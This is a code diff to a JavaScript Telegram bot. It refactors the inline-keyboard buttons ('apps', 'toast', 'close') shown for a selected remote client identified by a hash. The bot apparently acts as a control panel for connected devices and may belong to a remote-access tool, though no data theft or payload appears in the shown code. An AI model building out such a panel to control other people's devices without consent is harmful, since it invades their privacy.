@@ -150,7 +150,6 @@ bot.on("message", async (msg) => {
                             }
                         }
         
-                        // Add close button
                         layers[layer_index].push({
                             text: makeFont("close"),
                             callback_data: `close_${msg.from.id}`
@@ -246,71 +245,48 @@ bot.on('callback_query', async (call) => {
                         }
                     }
                 )
-            } else if (call.data.startsWith("back")){
+            } else if (call.data.startsWith("back")) {
                 let chash = spl[2];
-                for (let cli of jsclients){
-                    if (cli.hash == chash){
+                for (let cli of jsclients) {
+                    if (cli.hash === chash) {
                         let _str = `🔊 | selected user ${chash}\n🥤 | has ${cli.accessory.length} access`;
-                        let layers = [];
+                        let layers = [[]]; // Start with one empty layer
                         let layer_index = 0;
-                        for (let access of cli.accessory){
-                            if (layers.length == 0){layers.push([]);}
-                            switch (access){
+        
+                        for (let access of cli.accessory) {
+                            if (layers[layer_index].length === 3) {
+                                layer_index++;
+                                layers[layer_index] = [];
+                            }
+                            switch (access) {
                                 case "getApplication":
-                                    if (layers[layer_index].length !== 3){
-                                        layers.splice(layer_index, 0, [])
-                                        layers[layer_index].push({
-                                            text: makeFont("apps 📪"),
-                                            callback_data: `getApps_${call.from.id}_${chash}`
-                                        })
-                                    } else {
-                                        layers.push([]);
-                                        layer_index += 1;
-                                        layers[layer_index].push({
-                                            text: makeFont("apps 📪"),
-                                            callback_data: `getApps_${call.from.id}_${chash}`
-                                        })
-                                    }
+                                    layers[layer_index].push({
+                                        text: makeFont("apps 📪"),
+                                        callback_data: `getApps_${call.from.id}_${chash}`
+                                    });
                                     break;
-                                
                                 case "sendToast":
-                                    if (layers[layer_index].length !== 3){
-                                        layers.splice(layer_index, 0, [])
-                                        layers[layer_index].push({
-                                            text: makeFont("toast 📦"),
-                                            callback_data: `sendToast_${call.from.id}_${chash}`
-                                        })
-                                    } else {
-                                        layers.push([]);
-                                        layer_index += 1;
-                                        layers[layer_index].push({
-                                            text: makeFont("toast 📦"),
-                                            callback_data: `sendToast_${call.from.id}_${chash}`
-                                        })
-                                    }
+                                    layers[layer_index].push({
+                                        text: makeFont("toast 📦"),
+                                        callback_data: `sendToast_${call.from.id}_${chash}`
+                                    });
                                     break;
                             }
                         }
-                        if (layers[layers.length - 1] == []){
-                            layers[layers.length - 1].push({
-                                text: makeFont("close"),
-                                callback_data: `close_${call.from.id}`
-                            })
-                        } else {
-                            layers.push([]);
-                            layers[layers.length - 1].push({
-                                text: makeFont("close"),
-                                callback_data: `close_${call.from.id}`
-                            })
-                        }
-                        
+        
+                        // Add close button
+                        layers[layer_index].push({
+                            text: makeFont("close"),
+                            callback_data: `close_${call.from.id}`
+                        });
+        
                         await bot.editMessageText(_str, {
-                            message_id: call.message.message_id,
                             chat_id: call.message.chat.id,
+                            message_id: call.message.message_id,
                             reply_markup: {
                                 inline_keyboard: layers
                             }
-                        })
+                        });
                         return;
                     }
                 }
